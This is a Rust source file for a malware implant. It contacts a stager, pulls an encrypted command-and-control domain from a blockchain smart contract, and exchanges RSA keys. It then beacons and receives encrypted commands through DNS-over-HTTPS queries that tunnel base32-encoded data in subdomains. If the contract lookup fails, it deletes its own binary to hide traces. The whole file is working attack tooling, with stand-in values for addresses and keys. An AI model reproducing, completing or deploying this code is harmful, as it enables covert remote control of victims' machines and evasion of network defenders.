use std::net::{TcpStream,Shutdown};
use std::io::prelude::*;
use std::io::Result;
use ethers::prelude::*;
use ethers::providers::{Http, Middleware, Provider};
use std::str::FromStr;
use web3::contract::{Contract, Options};
use http::{Request, Response};
use url::{Url, ParseError};
use base64::{Engine as _, alphabet, engine::{self, general_purpose}};
use hex_literal::hex;
use generic_array::typenum::*;
use std::process;
use aes::Aes128;
use block_modes::{BlockMode, Cfb};
use block_modes::block_padding::Pkcs7;
use std::str;
use std::error::Error;
use std::env;
use base32::{Alphabet, decode, encode};
use rsa::{RsaPublicKey, PublicKey, RsaPrivateKey, Pkcs1v15Encrypt, pkcs8::DecodePublicKey, Oaep, pkcs8::EncodePublicKey, pkcs8::LineEnding};
use sha2::{Sha256, Sha512, Digest};
type Aes128ECfb = Cfb<Aes128, Pkcs7>;

static Hash: &str = "UNIQUEHASH";
static ContractKey: &str = "SMARTCONTRACTKEY";
static TestnetRPC: &str = "https://endpoints.omniatech.io/v1/matic/mumbai/public";

use fancy_regex::Regex; 

fn parseCertificate(response: &str) -> String{
    let re = Regex::new(r"(?<==)(.*?)\\").unwrap();
    let mut result = String::new();

    let mut captures_iter = re.captures_iter(response);
    for x in captures_iter{
        let mut data = x.unwrap().get(0).unwrap().as_str();
        data = data.trim_end_matches("\\");
        result.push_str(&data);
    }
    return result.clone()

}

static mut SleepTime: Option<Mutex<u64>> = None;

fn sendDnsRequest(domain: &str) -> Result<()>{
    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", domain)
        .append_pair("type", "A");

    let client = reqwest::blocking::Client::new();

    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();

    let mut response = request.unwrap();
    let mut data = response.text().unwrap();
    Ok(())
}

fn dnsRequestEncoder(domain: &str, message: &String){
    let dnsMAX = 255;
    let dnsdomainNameSize = domain.len();
    let maxDNSData = dnsMAX - dnsdomainNameSize;
    let mut packetOrder = 0;
    let base64Data = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &message.as_bytes()
    );
    let messageSize = base64Data.len();
    let mut messageRemainSize = messageSize;
    let mut lastPacket = 0;


    let mut result = String::new();
    

    for (i, c) in base64Data.chars().enumerate() {
        if i % 61 == 0 && i != 0{
            result.push('.');
        }
        if (result.len() >= (maxDNSData - dnsdomainNameSize)){
            packetOrder += 1;
            let s = format!("-{}-{}-", packetOrder, result.len());
            result.push_str(&s);
            result.push('.');
            result.push_str(domain);
            lastPacket = 1;
            sendDnsRequest(&result);
            result.clear();
        }
        result.push(c);
    }
    if lastPacket == 1 || result.len() < 255{
        packetOrder += 1;
        let s = format!("-{}-{}-_", packetOrder, result.len());
        result.push_str(&s);
        result.push('.');
        result.push_str(domain);
        sendDnsRequest(&result);
        result.clear();
        lastPacket = 0;
    }


}
use std::sync::Mutex;
use lazy_static::lazy_static;



fn generateKeyPair() -> (String, RsaPrivateKey){
    let mut rng = rand::thread_rng();
    let bits = 2048;
    let private_key_local = RsaPrivateKey::new(&mut rng, bits).unwrap();
    let public_key = RsaPublicKey::from(&private_key_local);
    let pubkey_der = public_key.to_public_key_der().unwrap();
    let pubkey_der_string = pubkey_der.to_pem("PUBLIC KEY", LineEnding::default()).unwrap();
    (pubkey_der_string, private_key_local)

}

// generate RSA keypair and send public key to C2 over DoH
fn handleKeyGeneration(domain: &str, serverPublicKey: &str) -> (String, RsaPrivateKey){
    let (pubkey, privkey) = generateKeyPair();
    let pubkeyBase32 = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &pubkey.as_bytes()
    );

    let mut hasher = Sha256::new();
    hasher.update(serverPublicKey);
    let result = hasher.finalize();

    let serverPublicKeySha256: String = format!("{:x}", result);
    let s = format!("1|{}|{}", serverPublicKeySha256, pubkeyBase32);
    dnsRequestEncoder(domain, &s);
    (serverPublicKeySha256, privkey)
}
use std::{thread, time};
 
fn parseDNSTextEntry(response: &str) -> String{
    let re = Regex::new(r"(?<=dv=)(.*?)\\").unwrap();
    let mut result = String::new();
    
    let mut captures_iter = re.captures_iter(response);
    for x in captures_iter{
        let mut data = x.unwrap().get(0).unwrap().as_str();
        data = data.trim_end_matches("\\");
        println!("Regex! {}", &data);
        result.push_str(&data);
    }
    return result.clone()
}

fn is_base32(s: &str) -> bool {
    println!("Checking data");
    let decode = base32::decode(Alphabet::RFC4648 { padding: true }, s);
    if decode.is_some(){
        return true
    }
    if decode.is_none(){
        return false
    }
    return false
}

fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey, public_key_hash: &str) -> Vec<String>{
    let mFormat: String = format!("2|{}", public_key_hash);
    let base32Data = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &mFormat.as_bytes()
    );
    let dnsMAX = 255;
    let dnsdomainNameSize = domain.len();
    let maxDNSData = dnsMAX - dnsdomainNameSize;
    let mut packetOrder = 0;
    let messageSize = base32Data.len();
    let mut messageRemainSize = messageSize;
    let mut lastPacket = 0;
    let mut result = String::new();

    for (i, c) in base32Data.chars().enumerate() {
        if i % 61 == 0 && i != 0{
            result.push('.');
        }
        if (result.len() >= (maxDNSData - dnsdomainNameSize)){
            packetOrder += 1;
            let s = format!("-{}-{}-", packetOrder, result.len());
            result.push_str(&s);
            result.push('.');
            result.push_str(domain);
            lastPacket = 1;
        }
        result.push(c);
    }
    if lastPacket == 1 || result.len() < 255{
        packetOrder += 1;
        let s = format!("-{}-{}-_", packetOrder, result.len());
        result.push_str(&s);
        result.push('.');
        result.push_str(domain);
        lastPacket = 0;
    }

    println!("Ping encoded :: {}", &result);
    println!("Checking TXT entry");

    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", &result)
        .append_pair("type", "TXT");
    let client = reqwest::blocking::Client::new();
    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();
    let mut response = request.unwrap();
    let mut data = response.text().unwrap();

    result.clear();


    println!("Data before regex {}", &data);
    let mut ndata = parseDNSTextEntry(&data);
    println!("Data after regex {}", &ndata);

    let bFlag = is_base32(&ndata);
    if bFlag == false{
        let commandDecoded = &base64::decode(ndata).unwrap();
        println!("Decoded {:?}", &commandDecoded);
        let padding = Oaep::new::<sha2::Sha256>();
        let dec_data = private_key_internal.decrypt(padding, &commandDecoded);
        match dec_data{
            Ok(dec_data) =>{
                let utf_data = String::from_utf8(dec_data).unwrap();
                let new_string: String = utf_data.to_owned();
                let parts: Vec<String> = new_string.split('|').map(|s| s.to_string()).collect();
                println!("Data {:?}", &parts);
                return parts;
            }
            Err(err)=>{
                println!("Error! {}", err);
                return vec![]
            }
        }
    }
    ndata.clear();
    return vec![];
}

//fn dnsRequestEncryptEncode(domain: &str, data: &str, public_key_external: &RsaPublicKey){
 //   let padding = Oaep::new::<sha2::Sha256>();
  //  let mut rng = rand::thread_rng();
   // let enc_data = public_key_external.encrypt(&mut rng, padding, &data[..]);
   //s println!("{:?}", enc_data.unwrap());
//}

fn commandServerHandler(domain: &str, public_key_external: &RsaPublicKey, public_key_hash: &str, private_key_internal: &RsaPrivateKey){
    println!("command server!");
    unsafe{
        if let Some(ref mutex) = SleepTime{
            while true{
                let mut stime = mutex.lock().unwrap();
                let ten_millis = time::Duration::from_millis(*stime);
                let command = checkDNSTextEntry(&domain, &private_key_internal, &public_key_hash);
                if !command.is_empty(){
                    match command.get(1).unwrap().as_str() {
                        "a" => println!("o segundo elemento é um!"),
                        "s" => {
                                let s: String = format!("s|{}", public_key_hash);
                                dnsRequestEncoder(domain, &s);
                                println!("Data :: {}", command.get(2).unwrap().as_str());
                                *stime = command.get(2).unwrap().parse().unwrap();
                                std::mem::drop(stime);
                            }
                        "x" => println!("o segundo elemento é três!"),
                        _ => println!("o segundo elemento não é válido!"),
                    }
                }
                thread::sleep(ten_millis);
            }
        }
    }
}


use std::time::Duration;
#[allow(unused_variables)]
fn serverHandler(domain: &str, public_key_external: RsaPublicKey, public_key_hash: &str, private_key_internal: &RsaPrivateKey){
    unsafe {
        SleepTime = Some(Mutex::new(10000)); // inicializa a variável global
    }
    let domain_clone = domain.to_string();
    let public_key_hash_clone = public_key_hash.to_string();
    let public_key_external_clone = public_key_external.clone();
    let private_key_clone = private_key_internal.clone();

    println!("ping server");
    thread::spawn(move || {
        commandServerHandler(&domain_clone, &public_key_external_clone, &public_key_hash_clone, &private_key_clone);
    });

    //let domain_clone2 = domain.to_string();
    //let public_key_hash_clone2 = public_key_hash.to_string();
    //thread::spawn(move || {
    //    commandServerHandler(&domain_clone2, &public_key_external_clone, &public_key_hash_clone2, &private_key_clone);
    //});

    loop {
        thread::sleep(Duration::from_secs(1));
    }
}


fn handleCertificate(domain: &str) -> Result<()>{
    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", domain)
        .append_pair("type", "TXT");

    let client = reqwest::blocking::Client::new();

    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();

    let mut response = request.unwrap();
    let mut data = response.text().unwrap();

    let mut result = String::new();
    result = parseCertificate(&data);
    let decoded_bytes = decode(
        Alphabet::RFC4648 { padding: true },
        &result
    ).unwrap();
    let public_key_external = Some(RsaPublicKey::from_public_key_pem(&String::from_utf8_lossy(&decoded_bytes)).unwrap());
    
    //let padding = Oaep::new::<sha2::Sha256>();
    //let mut rng = rand::thread_rng();
    // let data = b"hello world";
    // let enc_data = public_key.encrypt(&mut rng, padding, &data[..]).expect("failed to encrypt");
    // println!("Decoded: {:?}", public_key);

    let (serverPublicKeySha256, privkey) = handleKeyGeneration(domain, std::str::from_utf8(&decoded_bytes).unwrap());

    serverHandler(domain, public_key_external.unwrap(), &serverPublicKeySha256, &privkey);

    let s = format!("2|{}", serverPublicKeySha256);
    dnsRequestEncoder(domain, &s);

    Ok(())
}

use serde_json::Value;
use rustc_serialize::json::{Json, ToJson};

async fn handleContractKeccak(contractAddress: &str) -> String{
    // call RPC and interact with smart contract variable name (keccak)

    let mut payload = String::from(r#"{"method": "eth_call","params": [{"from": "0x0000000000000000000000000000000000000000","to": "CONTRACTADDRESS","data": "KECCAKHERE"},"latest"],"id": 1,"jsonrpc": "2.0"}"#);
    let newPayload = payload.replace("CONTRACTADDRESS", contractAddress);


    let mut object: Value = serde_json::from_str(&newPayload).unwrap();

    let client = reqwest::Client::new();
    let mut request = client.post(TestnetRPC)
    .json(&object)
    .send()
    .await;

    let response = request.unwrap().text().await.unwrap();
    println!("Response :: {}", response);
    //let jsonResponse: Value = serde_json::from_str(&response).unwrap();

    let json_object = Json::from_str(&response).unwrap();

    match json_object.find("result") {
        Some(field) => {
            let name = field.as_string().unwrap();
            let testing = hex::decode(&name[2..]).unwrap();
            let testStr = str::from_utf8(&testing).unwrap().replace(",","");
            let testStr = &testStr.trim_matches('\x00')[32..];
        
            return testStr.to_string()
        },
        None => {
            "".to_string()
        }
    }
}

use std::fs;
use std::mem;
use std::ptr;
use libc::{mprotect, PROT_NONE, PROT_READ};

#[tokio::main]
async fn rpcInteract(addr: &str) -> Result<((()), String)>{
    let contractC2 = handleContractKeccak(addr).await;
    if contractC2 == ""{
        let path = std::env::current_exe().unwrap();

        // Abra o arquivo binário para leitura
        let mut file = fs::File::open(&path).unwrap();
    
        // Carregue todo o arquivo binário na memória
        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer).unwrap();
    
        // Feche o arquivo para garantir que ele não esteja mais em uso
        drop(file);

        unsafe {
            ptr::write(buffer.as_mut_ptr(), mem::zeroed());
        }
    
        // Apague o binário
        fs::remove_file(&path).unwrap();

        let base_addr = std::ptr::null_mut();

        // Obter o tamanho do programa
        let program_size = 0; // Preencher com o tamanho do programa
    
        // Definir as permissões desejadas
        let prot = PROT_NONE;
    
        // Remover a permissão de leitura
        let result = unsafe { mprotect(base_addr, program_size, prot) };

        process::exit(0);
    }
    let C2AESContent_b64dec = base64::decode(contractC2).unwrap();
    let key_dec = base64::decode(ContractKey).unwrap();

    let key = &key_dec[..];

    let iv = &C2AESContent_b64dec[..16];
    let message  = &C2AESContent_b64dec[16..];
    
    let mut buf = message.to_vec();

    let cipher = Aes128ECfb::new_from_slices(&key, &iv).unwrap();
    let decrypted_ciphertext = cipher.decrypt(&mut buf).unwrap();

    let domain = String::from_utf8_lossy(decrypted_ciphertext);
    Ok(((()), domain.to_string()))
}

fn main() -> std::io::Result<()> {
    let mut stream = TcpStream::connect("STAGERADDRESS")?;
    let mut smartContractAddressBuffer= [0; 42];

    stream.write(&Hash.as_bytes())?;
    stream.read(&mut smartContractAddressBuffer)?;
    stream.shutdown(Shutdown::Both);

    let smartContractAddress = std::str::from_utf8(&smartContractAddressBuffer).unwrap().trim_matches(char::from(0));
    let rpcResponse = rpcInteract(smartContractAddress);


    match rpcResponse{
        Ok((_, domain)) =>{
            handleCertificate(&domain);
        }
        Err(e) =>{
            process::exit(0);
        }
    }

    Ok(())
}
